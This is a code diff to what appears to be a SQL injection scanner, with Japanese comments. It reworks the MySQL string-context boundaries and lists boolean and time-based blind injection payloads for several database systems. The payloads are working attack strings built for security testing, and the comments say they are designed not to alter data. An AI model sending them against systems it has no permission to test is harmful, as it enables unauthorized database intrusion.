@@ -140,8 +140,9 @@ EXPR_BOUNDS = [    # (対象 DBMS, 種別, 接頭辞, 接尾辞, 安全か)。�
     (None,         "num", "-(CASE WHEN (", ") THEN 0 ELSE (SELECT 0 UNION ALL SELECT 0) END)", True),
     ("PostgreSQL", "str", "'||(SELECT CASE WHEN pg_backend_pid()>0 AND (",
                           ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)||'", True),
-    # MySQL の || は OR。参照系（GET / --risk 2）でだけ使う。真のとき 0 を返すので WHERE col='v' の結果は変えない
-    ("MySQL",      "str", "'||(SELECT CASE WHEN (", ") THEN 0 ELSE (SELECT 0 UNION ALL SELECT 0) END)||'", False),
+    # MySQL 用（下の MYSQL_STR_BOUNDS の「括弧を閉じない」形）。GET 以外・--risk 1 では深い括弧から順に試すので、ここでは外す
+    ("MySQL",      "str", "'=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND (CASE WHEN (",
+                          ") THEN 1 ELSE (SELECT 1 UNION ALL SELECT 1) END)=1) AND 'a'='a", False),
     (None,         "lst", ",(SELECT CASE WHEN (", ") THEN NULL ELSE (SELECT 0 UNION ALL SELECT 0) END)", True),
     ("MSSQL",      "str", "'+(SELECT CASE WHEN @@SPID>0 AND (", ") THEN '' ELSE (SELECT '' UNION ALL SELECT '') END)+'", True),
     ("SQLite",     "num", "-(CASE WHEN (", ") THEN 0 ELSE abs(-9223372036854775808) END)", True),
@@ -153,22 +154,46 @@ EXPR_BOUNDS = [    # (対象 DBMS, 種別, 接頭辞, 接尾辞, 安全か)。�
     ("Oracle",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE (SELECT 0 FROM DUAL UNION ALL SELECT 0 FROM DUAL) END)", True),
     ("Oracle",     "lst", ",(CASE WHEN (", ") THEN NULL ELSE 1/0 END)", True),      # GROUP BY（副問い合わせが書けない）用
 ]
-# GET 以外・--risk 1 で送る唯一の AND 型。MySQL / MariaDB 専用（@@sql_mode はほかの DBMS では実行前にエラーになる）。
-# MySQL には文字列の位置で「値を変えない式」が無いので、クォートを閉じ直す AND を使う。
-# AND は、値が括弧の中（IN ('v') / LOWER('v') / ('v')）にあると 0 / 1 という「値」に化けて別の行に効く。
+# MySQL / MariaDB の文字列用。MySQL には文字列の位置で「値を変えない式」が無い（|| は OR、+ は加算）ので、
+# クォートを閉じたあと「比較の結果」に副問い合わせをつなぐ:
+#   WHERE name='v'=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND <条件>) AND 'a'='a' AND owner=7
+#     → ((name='v') = '1') AND 'a'='a' AND owner=7
+#   条件が真なら副問い合わせは '1' → 元の比較と同じ（後ろの条件もそのまま残る）。偽なら NULL → 0 行。
+# ・AND でつなぐ形と違い、MySQL 8 でも左辺が偽の行で評価が省かれない。'1' を文字列にしてあるので、INSERT / UPDATE の
+#   値の中（'v'='1'）でも数値変換のエラーにならず、遅延まで進む。
+# ・boolean では <条件> を「偽なら複数行の副問い合わせでエラー」にする。エラーにする部分を WHERE の内側に置くのは、
+#   DELETE IGNORE / UPDATE IGNORE がエラーを握り潰しても「元と同じ」か「0 行」にしかならないようにするため
+#  （比較の右辺に直接置くと、握り潰されたとき 0 になって一致が反転する）。
+# ・@@sql_mode を入れてあるので、ほかの DBMS では実行前にエラーになる。
+# 値が括弧の中（IN ('v') / LOWER('v') / ('v')）にあると、この式は「値」の一部になって別の行に効く。
 # 括弧を多く閉じすぎた形は構文エラーで止まる（無害）ので、深い方から順に試し、構文として通った深さで打ち切る
 #（それより浅い形は送らない）。対応するのは括弧 2 重まで。
-def _safe_and(q, depth):
-    return (q + ")" * depth + " AND @@sql_mode IS NOT NULL", " AND " + "(" * depth + "%sa%s=%sa" % (q, q, q))
+def _mysql_str(q, depth):
+    return (q + ")" * depth + "=(SELECT '1' FROM DUAL WHERE @@sql_mode IS NOT NULL AND ",
+            ") AND " + "(" * depth + "%sa%s=%sa" % (q, q, q))
 
 
-SAFE_AND_BOUNDS = [_safe_and(q, depth) for q in ("'", "\"") for depth in (2, 1, 0)]
+def _mysql_and(q, depth):
+    return (q + ")" * depth + " AND @@sql_mode IS NOT NULL AND ", " AND " + "(" * depth + "%sa%s=%sa" % (q, q, q))
+
+
+_MYSQL_DEPTHS = [(q, depth) for q in ("'", "\"") for depth in (2, 1, 0)]
+# boolean 用: (接頭辞, 接尾辞)。条件が偽なら副問い合わせが複数行になり SQL エラー
+MYSQL_STR_BOUNDS = [(_mysql_str(q, d)[0] + "(CASE WHEN (",
+                     ") THEN 1 ELSE (SELECT 1 UNION ALL SELECT 1) END)=1" + _mysql_str(q, d)[1]) for q, d in _MYSQL_DEPTHS]
+# time 用。前半は上と同じ形。後半は定数の AND: MySQL 8 は、ほかの条件で行が 1 つも残らないとき（ログインフォームの
+# パスワード側など）前半の式を評価しないが、表に依存しない AND の項は先に 1 回評価する。INSERT / UPDATE の値の中では
+# 逆に前半しか遅延しない。
+MYSQL_STR_TIME_BOUNDS = [_mysql_str(q, d) for q, d in _MYSQL_DEPTHS] + [_mysql_and(q, d) for q, d in _MYSQL_DEPTHS]
+# 接頭辞 → (クォート, 括弧の深さ)。「この深さで構文が通った」と分かったら、同じクォートのそれより浅い形は送らない
+MYSQL_DEPTH = dict((b[0], qd) for bs in (MYSQL_STR_BOUNDS, MYSQL_STR_TIME_BOUNDS)
+                   for b, qd in zip(bs, _MYSQL_DEPTHS + _MYSQL_DEPTHS))
 # time 用の式コンテキスト境界（連結・演算・並びに埋め込む）。中身は各 DBMS の遅延式。
-# 遅延したあとの値は 0 / '' / NULL（元の値を変えない）。MySQL の文字列だけは上と同じ理由で AND を閉じ直す形。
+# 遅延したあとの値は 0 / '' / NULL（元の値を変えない）。MySQL の文字列だけは上と同じ理由で「比較の結果」につなぐ形。
 # ほかの DBMS の連結形は、中の遅延式（PG_SLEEP / DBMS_PIPE / sqlite_version 入りの重い処理）が MySQL では実行前にエラーになる。
 TIME_EXPR_BOUNDS = {
-    # 文字列は SAFE_AND_BOUNDS と同じ並び（深い括弧から）。遅延したら構文として通った証拠なので、そこで終わる
-    "MySQL":      [(pre + " AND ", suf) for pre, suf in SAFE_AND_BOUNDS]
+    # 文字列は深い括弧から順（MYSQL_STR_TIME_BOUNDS）。遅延したら構文として通った証拠なので、それより浅い形は送らない
+    "MySQL":      MYSQL_STR_TIME_BOUNDS
                   + [("-(SELECT 0 FROM DUAL WHERE ", ")"), (",(SELECT NULL FROM DUAL WHERE ", ")")],
     "PostgreSQL": [("'||(SELECT '' WHERE ", ")||'"), ("-(SELECT 0 WHERE ", ")"), (",(SELECT NULL WHERE ", ")")],
     "Oracle":     [("'||(SELECT NULL FROM DUAL WHERE ", ")||'"), ("-(SELECT 0 FROM DUAL WHERE ", ")"),
@@ -812,6 +837,7 @@ class Ctx:
         self.union = None
         self.heavy = None       # 重い処理で検出したとき (DBMS, 式, n, 実測秒)
         self.tref = None        # boolean の「真」応答（UNION の基準に使う）
+        self.floor = {}         # MySQL の文字列の式: クォート → 構文が通った括弧の深さ（これより浅い形は送らない）
         self.kinds = set()      # 検出できた手法
         self.strong = False     # 確定と言える根拠があるか（boolean / time / union / DBMS 固有のエラー文）
         self.hits = []          # JSON 出力用
@@ -964,9 +990,9 @@ def expr_bounds(ctx):
     return [(pre, suf) for _, pre, suf in out]
 
 
-def safe_and_bounds(ctx):
-    """GET 以外・--risk 1 用の AND 型（MySQL 専用）を (接頭辞, 接尾辞, クォート) で返す。深い括弧から順。"""
-    bs = [(pre, suf, pre[0]) for pre, suf in SAFE_AND_BOUNDS if ctx.dbms in (None, "MySQL")]
+def mysql_str_bounds(ctx):
+    """GET 以外・--risk 1 用の MySQL 文字列の境界を (接頭辞, 接尾辞, クォート) で返す。深い括弧から順。"""
+    bs = [(pre, suf, MYSQL_DEPTH[pre][0]) for pre, suf in MYSQL_STR_BOUNDS if ctx.dbms in (None, "MySQL")]
     if ctx.quote:
         bs.sort(key=lambda b: b[2] != ctx.quote)
     return bs
@@ -974,16 +1000,15 @@ def safe_and_bounds(ctx):
 
 def bool_candidates(ctx):
     """(接頭辞, 接尾辞, op, 組)。AND → OR（--risk 2 のみ）→ 式コンテキストの順。
-       GET 以外・--risk 1 では AND 型を原則送らない。AND は値が比較の直接の相手でないと真偽値（0 / 1）に化け、
+       GET 以外・--risk 1 では AND 型を送らない。AND は値が比較の直接の相手でないと真偽値（0 / 1）に化け、
          DELETE ... WHERE id IN (3 AND 1=1)        →  IN (1)
          DELETE ... WHERE id IN (ABS(3) AND 1=1 AND (7=7))
          DELETE ... WHERE id IN ('3' AND 1=1 AND 'a'='a')
-       のように別の ID の行に効くため。数値・文字列・並びの位置は「値を変えない式」で調べ、
-       その式が書けない MySQL の文字列だけ、MySQL でしか動かない AND（SAFE_AND_BOUNDS）を使う。
-       「組」は SAFE_AND_BOUNDS のクォート文字。同じ組は深い括弧から順に並んでいて、途中で打ち切ることがある。"""
+       のように別の ID の行に効くため。数値・文字列・並びの位置は「値を変えない式」だけで調べる。
+       「組」は MYSQL_STR_BOUNDS のクォート文字。同じ組は深い括弧から順に並んでいて、途中で打ち切ることがある。"""
     if not allow_comment():
-        for pre, suf, q in safe_and_bounds(ctx):
-            yield pre, suf, "AND", q
+        for pre, suf, q in mysql_str_bounds(ctx):
+            yield pre, suf, "", q
         for pre, suf in expr_bounds(ctx):
             yield pre, suf, "", None
         return
@@ -1000,15 +1025,14 @@ def bool_candidates(ctx):
 def safe_guess(d, numeric, quote):
     """GET 以外・--risk 1 で境界が未確定のまま提示するときの閉じ方。ツール自身が送るのと同じ「値を変えない」形にする。"""
     if not numeric and d == "MySQL":
-        b = _safe_and('"' if quote == '"' else "'", 0)
-        return b[0], b[1], "AND"
+        pre, suf = MYSQL_STR_BOUNDS[5 if quote == '"' else 2]       # 括弧を閉じない形
+        return pre, suf, ""
     kind = "num" if numeric else "str"
     for want in (d, None):
         for dd, k, pre, suf, safe in EXPR_BOUNDS:
             if dd == want and k == kind and safe:
                 return pre, suf, ""
-    b = _safe_and("'", 0)
-    return b[0], b[1], "AND"
+    return MYSQL_STR_BOUNDS[2][0], MYSQL_STR_BOUNDS[2][1], ""
 
 
 def test_boolean(ctx):
@@ -1016,9 +1040,9 @@ def test_boolean(ctx):
     # 動的ページでは偶然の差で 1 回分の確認を通り抜けることがあるので、確認の回数を増やす
     rounds = NUMS[1:3] if ctx.thr == 0 else NUMS[1:5]
     blocked = lambda r: r.status in WAF_STATUS and r.status != ctx.base.status
-    # MySQL 用の AND（SAFE_AND_BOUNDS）は「構文として通った深さ」で打ち切る。そのために、クォートで構文を
-    # 壊したときの応答を先に取っておく。壊しても応答が変わらない（エラーが見えない）なら、AND で真偽の差が
-    # 出ることも無いので、その組は送らない
+    # MySQL 用の文字列の式（MYSQL_STR_BOUNDS）は「構文として通った深さ」で打ち切る。そのために、クォートで
+    # 構文を壊したときの応答を先に取っておく。壊しても応答が変わらない（エラーが見えない）なら、条件が偽のときの
+    # エラーも見えず真偽の差は出ないので、その組は送らない
     err_ref, closed = {}, set()
 
     def broken(q, r):
@@ -1038,6 +1062,7 @@ def test_boolean(ctx):
         t1, f1 = send(pt, mk(NUM_A, NUM_A)), send(pt, mk(NUM_A, NUM_A + 1))
         if group and not t1.bad and not broken(group, t1):
             closed.add(group)       # この深さで構文が通った。これより浅い形は値の位置に入ってしまうので送らない
+            ctx.floor[group] = MYSQL_DEPTH[pre][1]
         if t1.bad or f1.bad or blocked(t1) or blocked(f1) or not ctx.differ(t1, f1):
             continue        # 片方だけ WAF に遮断された差は、SQL の真偽による差ではない
         # 別の数字でもう一度。真同士・偽同士が一致して初めて確定（偶然の差を排除）
@@ -1135,12 +1160,17 @@ def test_time(ctx):
     slow = lambda r: (not r.bad) and r.elapsed >= ctx.base_time + S * 0.8
     timeouts, found = 0, False
     for d, kind, fn, bound in time_candidates(ctx):
+        qd = MYSQL_DEPTH.get(bound[0])
+        if qd and qd[1] < ctx.floor.get(qd[0], -1):
+            continue            # MySQL の文字列の式: 構文が通ると分かった深さより浅い形は送らない
         r = send(pt, fn(S))
         if r.timeout:
             timeouts += 1
             continue
         if not slow(r):
             continue
+        if qd:                  # 遅延した = この深さで構文が通った（確認に失敗しても、これより浅い形には進まない）
+            ctx.floor[qd[0]] = max(ctx.floor.get(qd[0], -1), qd[1])
         # 対照（0 秒）が速く、もう一度送って再び遅い → 確定
         c = send(pt, fn(0))
         if c.bad or c.elapsed >= ctx.base_time + S * 0.5:
